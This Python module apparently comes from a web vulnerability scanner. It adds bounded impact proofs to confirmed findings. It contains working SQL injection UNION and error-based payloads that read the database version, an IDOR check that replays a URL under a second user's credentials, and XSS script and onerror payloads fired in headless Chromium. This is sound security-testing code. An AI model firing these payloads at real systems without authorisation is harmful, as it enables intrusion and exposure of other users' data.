"""Bounded, read-only impact proofs for confirmed findings.

A confirmed finding says a bug *exists* ("this parameter is injectable"). This
module takes one more safe step: it demonstrates minimum impact with a concrete,
read-only example ("arbitrary SQL runs -- here is the database version") so the
report shows theoretical impact, not just a technical signal. It never dumps
data, writes, or weaponizes: one bounded read per finding.

Proves three classes where "it exists" most understates impact:

* SQL injection -- one bounded UNION/error read reads back the DB version/user.
* IDOR / broken access control -- one bounded read as a *peer* identity against
  the owner's object URL, diffed against the owner's own read. If the peer gets
  the same body (or the same distinctive object ids), that is cross-user object
  read, demonstrated rather than merely asserted. Read-only, one peer request.
* Reflected XSS -- fires the payload in the headless browser and confirms a
  unique sentinel actually executes (an alert with the nonce, or the sentinel
  set on `window`). This one runs script, so it stays strictly behind
  --prove-impact and is bounded to the one confirmed finding.

Other confirmed classes already demonstrate impact in their own evidence: SSRF
via an out-of-band callback, path traversal via /etc/passwd contents, LFI via a
rot13'd file read.
"""

from __future__ import annotations

import hashlib
import re
import secrets
from collections.abc import Callable
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import httpx

from shroodler.probes.common import body_text, inject, normalize_params, request

# Split sentinel: the payload contains the two halves as separate string
# literals, so they only appear joined ("SHRDLRIMPACT") when the database
# actually concatenates them -- a reflected payload cannot produce the join.
_S_A = "SHRDLR"
_S_B = "IMPACT"
_SENTINEL = _S_A + _S_B

# version/user expressions across common engines.
_EXPRS = ("version()", "@@version", "sqlite_version()", "current_user")


def _union_payloads() -> list[str]:
    out: list[str] = []
    for expr in _EXPRS:
        concat = f"concat('{_S_A}','{_S_B}',{expr})"
        # 1-3 column UNIONs (column count must match the original query).
        out.append(f"' UNION SELECT {concat}-- -")
        out.append(f"' UNION SELECT null,{concat}-- -")
        out.append(f"' UNION SELECT null,null,{concat}-- -")
    # MySQL error-based (no column-count needed).
    out.append(f"' AND extractvalue(1,concat(0x7e,'{_S_A}','{_S_B}',version()))-- -")
    return out


def _proof_from_body(body: str) -> str | None:
    """Return the text just after the joined sentinel (the DB version/user)."""
    idx = body.find(_SENTINEL)
    if idx < 0:
        return None
    tail = body[idx + len(_SENTINEL) : idx + len(_SENTINEL) + 80]
    # Trim at the first delimiter a response/error would add around it.
    tail = re.split(r"['\"<>~)\n\r]", tail, maxsplit=1)[0].strip()
    return tail or "(empty)"


def prove_sqli(
    url: str,
    param: str,
    cookie_header: str = "",
    *,
    method: str = "GET",
    client: httpx.Client | None = None,
    pacer: Any = None,
) -> str | None:
    """One bounded read-only proof that arbitrary SQL executes.

    Returns the extracted DB version/user string (the impact proof), or None.
    """
    if not url or not param:
        return None
    normalized = normalize_params([{"name": param, "value": "1"}])
    for payload in _union_payloads():
        resp = inject(
            url,
            method,
            normalized,
            param,
            payload,
            cookie_header=cookie_header,
            client=client,
            pacer=pacer,
        )
        if resp is None:
            continue
        proof = _proof_from_body(body_text(resp))
        if proof:
            return proof
    return None


# ---------------------------------------------------------------------------
# IDOR / broken-access-control: peer fetch-and-diff
#
# A confirmed IDOR says "the peer session was not denied". This proof goes one
# step further and shows the peer actually *reads the owner's object*: one
# bounded GET as the peer against the owner's object URL, diffed against the
# owner's own read. Identical bodies -- or shared distinctive object ids -- are
# the cross-user read. Read-only, one peer request, never a write.
# ---------------------------------------------------------------------------

# id tokens that distinguish one user's object from another's. The URL's own
# path id is excluded from the diff (both principals request the same URL, so
# it is trivially shared and proves nothing).
_JSON_ID_RE = re.compile(
    r"""["']?(?:id|_id|uuid|guid|user_?id|owner_?id|account_?id|email|username)["']?"""
    r"""\s*[:=]\s*["']?([A-Za-z0-9_@.\-]{3,64})""",
    re.IGNORECASE,
)
_ID_SEG_RE = re.compile(r"^(?:\d{2,}|[0-9a-fA-F]{8,}|[A-Za-z0-9]{8,20})$")
# A body shorter than this is too small to be a meaningful owner object
# (empty JSON, a bare "ok", a redirect stub) -- identical short bodies are
# almost always a shared public response, not a cross-user read.
_MIN_IDOR_BODY = 16
_IDOR_SCAN_CHARS = 20000


def _body_hash(body: str) -> str:
    return hashlib.sha256((body or "").encode("utf-8", errors="replace")).hexdigest()


def _path_object_id(url: str) -> str:
    """The last id-looking path segment -- the owner's object id in the URL."""
    try:
        segs = [s for s in (urlparse(url).path or "").split("/") if s]
    except ValueError:
        return ""
    for seg in reversed(segs):
        if _ID_SEG_RE.fullmatch(seg):
            return seg
    return ""


def _distinctive_ids(body: str, path_id: str) -> set[str]:
    """Extract id/email/username tokens from a body, minus the shared path id."""
    out: set[str] = set()
    for value in _JSON_ID_RE.findall((body or "")[:_IDOR_SCAN_CHARS]):
        token = value.strip()
        if token and token != path_id:
            out.add(token)
    return out


def _entity_of(url: str) -> str:
    """Name the object type from the path, e.g. /api/orders/42 -> 'order'."""
    try:
        segs = [s for s in (urlparse(url).path or "").split("/") if s]
    except ValueError:
        return "object"
    for i in range(len(segs) - 1, 0, -1):
        if _ID_SEG_RE.fullmatch(segs[i]):
            name = segs[i - 1]
            if name and not _ID_SEG_RE.fullmatch(name):
                return name[:-1] if name.endswith("s") and len(name) > 3 else name
    return segs[-1] if segs else "object"


def _auth_present(cookie_header: str, headers: dict[str, str] | None) -> bool:
    """True when an identity carries some credential: a cookie OR a header.

    Lets token/bearer apps (``Authorization: Bearer ...`` with no session
    cookie) be proven, not just cookie-session apps.
    """
    return bool((cookie_header or "").strip()) or bool(headers)


def _auth_extra_headers(headers: dict[str, str] | None) -> dict[str, str] | None:
    """Per-identity auth headers to apply, minus any Cookie (that goes via the
    cookie_header arg, same as the peer path has always done)."""
    extra = {k: v for k, v in (headers or {}).items() if str(k).lower() != "cookie"}
    return extra or None


def prove_idor(
    url: str,
    owner_cookie_header: str = "",
    peer_cookie_header: str = "",
    *,
    owner_headers: dict[str, str] | None = None,
    peer_headers: dict[str, str] | None = None,
    method: str = "GET",
    client: httpx.Client | None = None,
    pacer: Any = None,
) -> str | None:
    """Prove cross-user object read: one owner read + ONE peer read, diffed.

    Each identity authenticates with a cookie (``*_cookie_header``) and/or
    arbitrary headers (``*_headers``, e.g. ``Authorization: Bearer ...``), so
    token-authenticated apps are provable alongside cookie-session ones. A read
    is attempted only when that identity carries some credential.

    Returns a short evidence string ("identical response body (N bytes)" /
    "shared object ids ...") when the peer identity reads the owner's object,
    else None. Read-only; the peer makes exactly one request; never writes.
    """
    if not url:
        return None
    if not _auth_present(owner_cookie_header, owner_headers):
        return None
    if not _auth_present(peer_cookie_header, peer_headers):
        return None
    verb = (method or "GET").upper() or "GET"
    if verb not in {"GET", "HEAD"}:
        return None
    owner = request(
        verb,
        url,
        cookie_header=owner_cookie_header,
        extra_headers=_auth_extra_headers(owner_headers),
        client=client,
        pacer=pacer,
    )
    if owner is None or not (200 <= int(getattr(owner, "status_code", 0) or 0) < 300):
        return None
    owner_body = body_text(owner)
    if len(owner_body.strip()) < _MIN_IDOR_BODY:
        return None
    # The single bounded peer read against the owner's object URL.
    peer = request(
        verb,
        url,
        cookie_header=peer_cookie_header,
        extra_headers=_auth_extra_headers(peer_headers),
        client=client,
        pacer=pacer,
    )
    if peer is None:
        return None
    peer_status = int(getattr(peer, "status_code", 0) or 0)
    if not (200 <= peer_status < 300):
        return None  # peer was denied / redirected -- access control holds
    peer_body = body_text(peer)
    if len(peer_body.strip()) < _MIN_IDOR_BODY:
        return None
    if _body_hash(owner_body) == _body_hash(peer_body):
        return f"identical response body ({len(peer_body)} bytes) returned to the peer session"
    path_id = _path_object_id(url)
    shared = _distinctive_ids(owner_body, path_id) & _distinctive_ids(peer_body, path_id)
    if shared:
        sample = ", ".join(sorted(shared)[:3])
        return f"peer response carried the owner's object identifiers ({sample})"
    return None


# ---------------------------------------------------------------------------
# Reflected XSS: fire the payload and confirm execution
#
# Unlike the read-only proofs above this one runs script, so it only fires
# behind --prove-impact, only for a confirmed reflected finding, and only for
# GET (navigation-fireable). It confirms *execution*, not just reflection: a
# unique sentinel must either surface as an alert() message or land on `window`.
# ---------------------------------------------------------------------------

# runner(fired_url, sentinel, cookie_header) -> evidence string | None.
XssRunner = Callable[..., "str | None"]


def _xss_exec_payloads(sentinel: str) -> list[str]:
    js = f"window.__shrXss={sentinel!r};alert({sentinel!r})"
    return [
        f"<script>{js}</script>",
        f'"><script>{js}</script>',
        f"<img src=x onerror=\"{js}\">",
    ]


def _with_param(url: str, param: str, value: str) -> str:
    """Set/replace one query parameter, preserving the rest of the URL."""
    try:
        parsed = urlparse(url)
    except ValueError:
        return url
    pairs = [(k, v) for k, v in parse_qsl(parsed.query, keep_blank_values=True) if k != param]
    pairs.append((param, value))
    return urlunparse(parsed._replace(query=urlencode(pairs)))


def _default_xss_runner(
    fired_url: str,
    sentinel: str,
    *,
    cookie_header: str = "",
    screenshot_path: str | None = None,
) -> str | None:
    """Navigate headless to fired_url and confirm the sentinel executed.

    Runs the sync Playwright driver on its own thread so it never collides with
    an asyncio loop already running in the caller's thread (the same failure the
    HeadlessFetcher comment warns about). Swallows every error: a missing
    browser or a timeout means "unproven", never a crashed run.
    """
    result: dict[str, str | None] = {"evidence": None}

    def _work() -> None:
        try:
            from playwright.sync_api import sync_playwright
        except Exception:  # noqa: BLE001 - playwright not installed -> unproven
            return
        dialogs: list[str] = []
        pw = sync_playwright().start()
        try:
            browser = pw.chromium.launch(headless=True)
            ctx_kw: dict[str, Any] = {}
            if cookie_header:
                ctx_kw["extra_http_headers"] = {"Cookie": cookie_header}
            context = browser.new_context(**ctx_kw)
            page = context.new_page()
            page.on("dialog", lambda d: (dialogs.append(d.message), d.dismiss()))
            try:
                page.goto(fired_url, wait_until="domcontentloaded", timeout=15000)
                page.wait_for_timeout(600)
                fired = any(sentinel in (msg or "") for msg in dialogs)
                if not fired:
                    try:
                        fired = page.evaluate("() => window.__shrXss") == sentinel
                    except Exception:  # noqa: BLE001
                        fired = False
                if fired:
                    how = "alert() fired" if dialogs else "sentinel set on window"
                    note = f"payload executed in headless Chromium ({how}; sentinel {sentinel})"
                    if screenshot_path:
                        try:
                            page.screenshot(path=screenshot_path)
                            note += f"; screenshot {screenshot_path}"
                        except Exception:  # noqa: BLE001
                            pass
                    result["evidence"] = note
            finally:
                page.close()
                context.close()
                browser.close()
        except Exception:  # noqa: BLE001 - any browser failure -> unproven
            pass
        finally:
            try:
                pw.stop()
            except Exception:  # noqa: BLE001
                pass

    import threading

    thread = threading.Thread(target=_work, daemon=True)
    thread.start()
    thread.join(timeout=45)
    return result["evidence"]


def prove_reflected_xss(
    url: str,
    param: str,
    *,
    cookie_header: str = "",
    method: str = "GET",
    runner: XssRunner | None = None,
    screenshot_path: str | None = None,
) -> str | None:
    """Fire a nonce payload and confirm it executes. Returns evidence or None.

    Only GET (navigation-fireable) reflected findings are provable this way;
    POST-reflected payloads cannot be fired by a plain navigation and are
    skipped. Bounded: at most a few payload variants, one navigation each.
    """
    if not url or not param:
        return None
    if (method or "GET").upper() != "GET":
        return None
    run = runner or _default_xss_runner
    sentinel = f"shroodler-xss-exec-{secrets.token_hex(4)}"
    for payload in _xss_exec_payloads(sentinel):
        fired_url = _with_param(url, param, payload)
        try:
            evidence = run(
                fired_url,
                sentinel,
                cookie_header=cookie_header,
                screenshot_path=screenshot_path,
            )
        except Exception:  # noqa: BLE001 - impact proof must never break a run
            evidence = None
        if evidence:
            return evidence
    return None


_PARAM_RE = re.compile(r"param=([A-Za-z0-9_.\-\[\]]+)")

# Confirmed finding ids whose impact is best shown by a peer fetch-and-diff.
# graphql-idor / peer-write-* are intentionally absent: the first is not an
# object-addressed GET URL, the second is a write finding. looks_like_idor_url
# gates the rest to genuinely object-addressed endpoints.
_IDOR_IDS = frozenset(
    {
        "idor",
        "idor-cross-account",
        "authz-broken-access-control",
        "authz-still-accessible",
        "chain-idor-peer-access",
    }
)


def _param_of(finding: Any) -> str:
    evidence = str(getattr(finding, "evidence", "") or "")
    match = _PARAM_RE.search(evidence)
    return match.group(1) if match else ""


def _is_object_addressed(url: str) -> bool:
    try:
        from shroodler.idor_engine import looks_like_idor_url

        return bool(looks_like_idor_url(url))
    except Exception:  # noqa: BLE001 - never let a helper import break the proof
        return bool(_path_object_id(url))


def _append_note(finding: Any, note: str) -> bool:
    try:
        finding.evidence = str(getattr(finding, "evidence", "") or "") + note
    except Exception:  # noqa: BLE001
        return False
    return True


def _prove_sqli_finding(finding: Any, url: str, cookie_header, client, pacer) -> str | None:
    param = _param_of(finding)
    if not param:
        return None
    try:
        proof = prove_sqli(url, param, cookie_header, client=client, pacer=pacer)
    except Exception:  # noqa: BLE001 - impact proof must never break a run
        return None
    if not proof:
        return None
    return f" IMPACT: arbitrary SQL executes; read back DB version/user = {proof!r}"


def _prove_idor_finding(
    finding: Any,
    url: str,
    cookie_header,
    owner_headers,
    peer_cookie_header,
    peer_headers,
    client,
    pacer,
) -> str | None:
    if not _auth_present(peer_cookie_header, peer_headers) or not _is_object_addressed(url):
        return None
    try:
        proof = prove_idor(
            url,
            cookie_header,
            peer_cookie_header,
            owner_headers=owner_headers,
            peer_headers=peer_headers,
            client=client,
            pacer=pacer,
        )
    except Exception:  # noqa: BLE001 - impact proof must never break a run
        return None
    if not proof:
        return None
    entity = _entity_of(url)
    return f" IMPACT: peer identity read owner's {entity} (cross-user object read); {proof}"


def _prove_xss_finding(finding: Any, url: str, cookie_header, runner) -> str | None:
    param = _param_of(finding)
    if not param:
        return None
    try:
        proof = prove_reflected_xss(url, param, cookie_header=cookie_header, runner=runner)
    except Exception:  # noqa: BLE001 - impact proof must never break a run
        return None
    if not proof:
        return None
    return f" IMPACT: reflected XSS executes; {proof}"


def annotate_impact(
    findings: list[Any],
    *,
    cookie_header: str = "",
    owner_headers: dict[str, str] | None = None,
    peer_cookie_header: str = "",
    peer_headers: dict[str, str] | None = None,
    client: httpx.Client | None = None,
    pacer: Any = None,
    prove_xss: bool = False,
    xss_runner: XssRunner | None = None,
) -> int:
    """Attach an IMPACT proof to confirmed SQLi, IDOR and reflected-XSS findings.

    Returns how many were annotated. SQLi and IDOR proofs are read-only and
    bounded; the XSS proof runs script and only fires when ``prove_xss`` is set
    (the caller gates that on --prove-impact). Never raises; a finding that
    cannot be proven is simply left unannotated.
    """
    annotated = 0
    for finding in findings or []:
        fid = str(getattr(finding, "id", "") or "")
        conf = str(getattr(finding, "confidence", "") or "")
        if conf != "confirmed":
            continue
        if "IMPACT:" in str(getattr(finding, "evidence", "") or ""):
            continue  # already proven
        url = str(getattr(finding, "url", "") or "")
        note: str | None = None
        if fid.startswith("sqli"):
            note = _prove_sqli_finding(finding, url, cookie_header, client, pacer)
        elif fid in _IDOR_IDS:
            note = _prove_idor_finding(
                finding,
                url,
                cookie_header,
                owner_headers,
                peer_cookie_header,
                peer_headers,
                client,
                pacer,
            )
        elif prove_xss and fid == "xss-reflected":
            note = _prove_xss_finding(finding, url, cookie_header, xss_runner)
        if not note:
            continue
        if _append_note(finding, note):
            annotated += 1
    return annotated
